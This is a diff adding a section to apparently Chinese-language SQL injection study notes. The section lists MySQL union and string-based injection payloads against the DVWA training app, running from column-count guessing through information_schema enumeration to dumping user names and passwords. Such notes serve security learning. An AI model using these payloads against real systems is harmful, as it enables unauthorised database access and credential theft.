@@ -156,3 +156,31 @@ PostgreSQL识别：
 ["1337=1337",   "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
 ["'i'='i'",     "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
 ```
+
+## 3.注入类型
+
+（1）MySQL注入
+
+联合注入：
+```sql
+select user,password from users where user_id=1 union select 1,2;
+select * from users where user_id = 1 union select * from users where user_id = 2 ;
+字符型注入dvwa
+1' or '1234'=1234
+1' or 'abcd' = 'abcd'
+1' or 1=1 order by 1 //猜测字段
+select * from users order by password ;
+1' or 1=1 order by 2 #
+1' or 1=1 order by 3 #
+1' union select 1,database() #
+1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() //获取数据库中的表
+select group_concat(user) from users where user_id=1 or user_id=2;
+1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users' //获取表字段名
+1' or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users 
+{
+id=-1 union select 1,2,3,database(),5,6,7,8
+(select table_name from information_schema.tables where table_schema='dvwa' limit 1,1),5,6,7,8
+(select column_name from information_schema.columns where table_schema='dvwa'  and table_name='users' limit 4,1)
+(select password from dvwa.users limit 0,1),(select user from dvwa.users limit 0,1)
+}
+```
